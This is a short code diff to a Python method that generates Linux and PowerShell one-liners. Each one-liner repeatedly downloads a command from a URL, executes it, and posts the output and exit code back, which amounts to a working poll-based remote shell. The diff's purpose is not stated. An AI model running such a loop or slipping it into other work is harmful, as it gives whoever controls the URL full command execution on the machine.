@@ -168,16 +168,21 @@ class ExternalCallSession:
 
     def one_liners(self, url):
         linux = (
-            "(u={0};while c=$(curl -fsS $u);"
-            "do o=$(bash -c \"$c\" </dev/null 2>&1);"
-            "curl -fsS --data-raw \"$o\" \"$u?e=$?\";"
-            "printf '%s\\n' \"$c\" \"$o\";done)"
+            "(u={0};while c=$(curl -fsS \"$u\");"
+            "do o=$(bash -c \"$c\" </dev/null 2>&1);e=$?;"
+            "printf '%s\\n' \"$c\" \"$o\";"
+            "printf '%s' \"$o\"|curl -fsS --data-binary @- \"$u?e=$e\"||break;done)"
         ).format(shlex.quote(url))
         windows = (
-            "&{{$u={0};while(1){{$c=irm $u -ea Stop;"
-            "$o=(& (gps -Id $PID).Path -nop -noni -c {{iex $args[0]}} -args $c 2>&1|Out-String);"
-            "irm \"$u?e=$LASTEXITCODE\" -Method post "
-            "-Body ([Text.Encoding]::UTF8.GetBytes($o)) -ea Stop;$c;$o}}}}"
+            "&{{$ErrorActionPreference='Continue';$u={0};"
+            "while(1){{try{{$c=irm $u -ea Stop}}catch{{break}};"
+            "$o=(& (gps -Id $PID).Path -nop -noni -c "
+            "{{iex $args[0];$s=$?;if($LASTEXITCODE){{exit $LASTEXITCODE}}"
+            "elseif(!$s){{exit 1}}}} -args $c 2>&1|Out-String);"
+            "$e=[int]$LASTEXITCODE;$c;$o;"
+            "try{{irm \"${{u}}?e=$e\" -Method post "
+            "-Body ([Text.Encoding]::UTF8.GetBytes([string]$o)) -ea Stop}}"
+            "catch{{$_;break}}}}}}"
         ).format(powershell_quote(url))
         return {"linux": linux, "windows": windows}
 
